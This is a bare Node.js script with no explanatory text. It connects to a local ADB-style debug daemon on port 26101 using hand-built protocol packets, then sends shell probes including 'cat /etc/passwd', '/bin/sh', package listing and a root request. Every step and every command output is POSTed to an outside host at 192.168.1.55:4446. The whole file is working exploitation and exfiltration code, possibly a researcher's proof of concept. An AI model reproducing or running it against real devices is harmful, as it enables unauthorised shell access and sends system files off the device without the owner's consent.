var net = require('net');
var http = require('http');
var HOST = '192.168.1.55';
function post(b) {
    try {
        var r = http.request({ host: HOST, port: 4446, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
post('C10?start');
function crc(b) { var res = 0; for (var i = 0; i < b.length; ++i) res = (res + b[i]) & 0xFFFFFFFF; return res >>> 0; }
function pkt(cmd, a1, a2, payload) {
    var b = new Buffer(24 + payload.length);
    b.writeUInt32LE(cmd, 0); b.writeUInt32LE(a1, 4); b.writeUInt32LE(a2, 8);
    b.writeUInt32LE(payload.length, 12); b.writeUInt32LE(crc(payload), 16);
    b.writeUInt32LE((0xFFFFFFFF - cmd) >>> 0, 20);
    payload.copy(b, 24);
    return b;
}
var s = net.connect(26101, '127.0.0.1');
var buf = new Buffer(0);
var probes = [
    'shell:0 debug 0',
    'shell:0 help',
    'shell:0 log',
    'shell:0 pkgcmd -l',
    'shell:0 mount',
    'shell:0 cat /etc/passwd',
    'shell:0 /bin/sh',
    'shell:0 echo hi',
    'sync:',
    'root:',
    'tcp:8080'
];
var pi = 0;
var cur = '';
var MYID = 12345;
function sendProbe() {
    if (pi >= probes.length) { post('C10?done'); return; }
    cur = probes[pi++];
    post('C10?probe=' + cur);
    s.write(pkt(0x4e45504f, MYID, 0, new Buffer(cur + '\0', 'binary')));
}
s.on('connect', function () {
    post('C10?tcp=ok');
    s.write(pkt(0x4e584e43, 0x01000000, 4096, new Buffer('host::\0', 'binary')));
});
s.on('data', function (d) {
    buf = Buffer.concat([buf, d]);
    while (buf.length >= 24) {
        var cmd = buf.readUInt32LE(0);
        var a1 = buf.readUInt32LE(4);
        var a2 = buf.readUInt32LE(8);
        var len = buf.readUInt32LE(12);
        if (buf.length < 24 + len) break;
        var payload = buf.slice(24, 24 + len);
        buf = buf.slice(24 + len);
        if (cmd === 0x4e584e43) { post('C10?cnxn=' + payload.toString('ascii')); sendProbe(); }
        else if (cmd === 0x59414b4f) { post('C10?OKAY[' + cur + ']'); }
        else if (cmd === 0x45545257 && a2 === MYID) { post('C10?DATA[' + cur + ']=' + payload.toString()); s.write(pkt(0x59414b4f, MYID, a1, new Buffer(0))); }
        else if (cmd === 0x45534c43 && a2 === MYID) { post('C10?CLSE[' + cur + ']'); sendProbe(); }
        else if (cmd === 0x48545541) { post('C10?AUTH'); }
    }
});
s.on('error', function (e) { post('C10?err=' + e.message); });
s.on('close', function () { post('C10?closed_sock'); });
